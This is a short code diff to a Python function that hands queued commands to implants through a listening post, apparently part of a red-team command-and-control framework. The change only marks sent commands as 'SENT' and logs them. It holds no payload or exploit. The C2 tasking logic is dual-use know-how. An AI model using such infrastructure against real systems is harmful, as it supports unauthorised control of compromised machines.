@@ -89,7 +89,6 @@ def lp_getcmd(frame, teamserver):
     :param teamserver:
     :return:
     """
-    # TODO: implement me
     lp_implants = []
     lp_implants.append(next(item for item in teamserver.implants if item["lp_id"] == frame['component_id']))
     reply_commands = []
@@ -103,6 +102,8 @@ def lp_getcmd(frame, teamserver):
                 cmd_index = next(
                     (index for (index, d) in enumerate(teamserver.cmd_queue) if d["txid"] == command["txid"]),
                     None)
+                teamserver.cmd_queue[cmd_index]['state'] = "SENT"
+                teamserver.cmd_sent.append(teamserver.cmd_queue[cmd_index])
                 teamserver.cmd_queue.pop(cmd_index)
         except StopIteration:
             pass
